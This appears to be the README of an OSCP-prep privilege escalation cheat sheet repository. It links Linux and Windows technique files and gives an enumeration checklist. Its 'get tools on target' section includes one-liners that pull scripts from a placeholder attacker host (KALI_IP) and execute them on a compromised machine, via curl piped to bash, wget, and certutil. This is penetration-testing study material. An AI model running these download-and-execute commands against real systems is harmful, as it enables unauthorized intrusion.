<div align="center">

<img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=700&size=26&pause=1000&color=3FB950&center=true&vCenter=true&width=600&lines=Privilege+Escalation+Cheat+Sheet;Linux+%26+Windows;OSCP+%7C+CTF+%7C+Red+Team;by+NullyBlissful" alt="Typing SVG" />

<br/>

![Linux](https://img.shields.io/badge/Linux-PrivEsc-3fb950?style=for-the-badge&logo=linux&logoColor=white)
![Windows](https://img.shields.io/badge/Windows-PrivEsc-0078d4?style=for-the-badge&logo=windows&logoColor=white)
![OSCP](https://img.shields.io/badge/OSCP-Critical_Topic-E94560?style=for-the-badge)

> *"Enumeration is not optional. It is the job."*

</div>

---

## 📁 Files in This Repo

| File | OS | Key Techniques |
|------|----|---------------|
| [Linux Privilege Escalation.md](./Linux%20Privilege%20Escalation.md) | 🐧 Linux | sudo, SUID, cron, caps, NFS, PATH hijack |
| [Windows Privilege Escalation.md](./Windows%20Privilege%20Escalation.md) | 🪟 Windows | Services, registry, tokens, AlwaysInstallElevated |

---

## 🧭 PrivEsc Mindset

```
Got a shell?
    │
    ▼
ENUMERATE FIRST — never guess
    │
    ├─► sudo -l              (always first on Linux)
    ├─► whoami /priv         (always first on Windows)
    ├─► Run linpeas / winpeas
    ├─► Check crons / scheduled tasks
    ├─► Hunt for credentials
    └─► Look for SUID / weak service permissions
```

> **95% of PrivEsc is enumeration. 5% is the actual exploit.**

---

## ⚡ One-Liners: Get Tools on Target

```bash
# From Kali — serve your tools
python3 -m http.server 80

# On Linux target — download linpeas
curl http://KALI_IP/linpeas.sh | bash
wget http://KALI_IP/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh

# On Windows target — download winpeas
certutil -urlcache -f http://KALI_IP/winPEASx64.exe C:\Temp\wp.exe && C:\Temp\wp.exe
powershell -c "iwr http://KALI_IP/winPEASx64.exe -o C:\Temp\wp.exe"
```

---

## 🔗 Related Repositories

[![Web Vuln](https://img.shields.io/badge/←_Web_Vulnerabilities-Initial_Access-E94560?style=flat-square)](https://github.com/MayanSuthar/Web-Vulnerability)
[![Pivoting](https://img.shields.io/badge/→_Pivoting-Internal_Network-1f6feb?style=flat-square)](https://github.com/MayanSuthar/Pivoting)
[![Shell](https://img.shields.io/badge/→_Shell_Upgrade-TTY_Stabilisation-3fb950?style=flat-square)](https://github.com/MayanSuthar/Shell-Upgrade)

---

<div align="center">
<sub>Part of <a href="https://github.com/MayanSuthar">NullyBlissful OSCP Prep Series</a> · <a href="https://medium.com/@mayan230848">Read writeups on Medium</a></sub>
</div>
